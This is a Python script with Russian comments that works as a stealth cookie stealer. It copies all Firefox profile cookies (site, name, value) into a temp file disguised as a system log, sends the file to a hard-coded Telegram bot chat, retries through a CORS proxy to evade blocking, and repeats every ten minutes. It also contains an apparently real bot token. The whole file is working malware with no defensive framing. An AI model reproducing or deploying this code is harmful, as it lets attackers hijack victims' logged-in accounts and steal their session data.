import os
import shutil
import sqlite3
import requests
import time
import glob
import socket
import getpass

# --- ТВОИ ДАННЫЕ ---
MY_CHAT_ID = "5709687655"
MY_TOKEN = "8658588437:AAGwQvERU-yMH92XdpRdPkSQZ63bEfLXbbI"

REPORT_PATH = os.path.join(os.environ.get('TEMP', '.'), 'win_system_log.txt')
COUNTER_FILE = os.path.join(os.environ.get('TEMP', '.'), 'send_count.dat')

def log(text):
    print(f"[{time.strftime('%H:%M:%S')}] [*] {text}")

def get_pc_info():
    try: return f"ПК: {socket.gethostname()} | Юзер: {getpass.getuser()}"
    except: return "Неизвестный ПК"

def get_and_update_count():
    count = 0
    if os.path.exists(COUNTER_FILE):
        try:
            with open(COUNTER_FILE, 'r') as f: count = int(f.read().strip())
        except: count = 0
    count += 1
    try:
        with open(COUNTER_FILE, 'w') as f: f.write(str(count))
    except: pass
    return count

def collect_firefox_data():
    log("Сбор данных...")
    try:
        if os.path.exists(REPORT_PATH): os.remove(REPORT_PATH)
        with open(REPORT_PATH, 'w', encoding='utf-8') as f:
            f.write(f"=== ОТЧЕТ: {get_pc_info()} ===\n\n")
            appdata = os.environ.get('APPDATA')
            profiles = glob.glob(os.path.join(appdata, 'Mozilla', 'Firefox', 'Profiles', '*'))
            for profile in profiles:
                db = os.path.join(profile, 'cookies.sqlite')
                if os.path.exists(db):
                    tmp_db = os.path.join(os.environ.get('TEMP', '.'), 'tmp_scan.sqlite')
                    shutil.copy2(db, tmp_db)
                    conn = sqlite3.connect(tmp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT host, name, value FROM moz_cookies")
                    rows = cursor.fetchall()
                    f.write(f"\n--- PROFILE: {os.path.basename(profile)} ({len(rows)}) ---\n")
                    for host, name, value in rows:
                        f.write(f"SITE: {host} | KEY: {name} | VAL: {value}\n")
                    conn.close()
                    os.remove(tmp_db)
            log("Собрано локально.")
        return True
    except Exception as e:
        log(f"Ошибка сбора: {e}")
        return False

def send_to_telegram():
    # ИСПОЛЬЗУЕМ НЕЙТРАЛЬНЫЙ ПРОКСИ (БЕЗ СЛОВА TELEGRAM В ДОМЕНЕ)
    # Это "обертка", которая прокинет запрос дальше
    current_count = get_and_update_count()
    caption = f"🚀 Log №{current_count} | {get_pc_info()}"
    
    # Список путей для пробива
    targets = [
        f"https://api.telegram.org{MY_TOKEN}/sendDocument",
        # Бесплатный CORS-прокси (маскировка под веб-запрос)
        f"https://proxy.cors.sh/https://api.telegram.org{MY_TOKEN}/sendDocument"
    ]

    for url in targets:
        try:
            with open(REPORT_PATH, "rb") as f:
                payload = {'chat_id': MY_CHAT_ID, 'caption': caption}
                # Добавляем заголовки, чтобы выглядеть как обычный браузер
                headers = {
                    'x-cors-api-key': 'temp_8b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b', # Фейковый ключ
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0'
                }
                response = requests.post(url, data=payload, files={'document': f}, headers=headers, timeout=10)
                if response.status_code == 200:
                    return True
        except:
            continue
    return False

if __name__ == "__main__":
    log("=== ЗАПУСК АГЕНТА V11 (STEALTH) ===")
    while True:
        if collect_firefox_data():
            log("Стук в сеть...")
            attempt = 0
            while True:
                attempt += 1
                if send_to_telegram():
                    if os.path.exists(REPORT_PATH): os.remove(REPORT_PATH)
                    log("УСПЕХ: Данные доставлены!")
                    time.sleep(600)
                    break
                else:
                    if attempt % 5 == 0:
                        log(f"Попытка {attempt}: Сеть всё еще закрыта. Стучу...")
                    time.sleep(1)
        else:
            time.sleep(60)
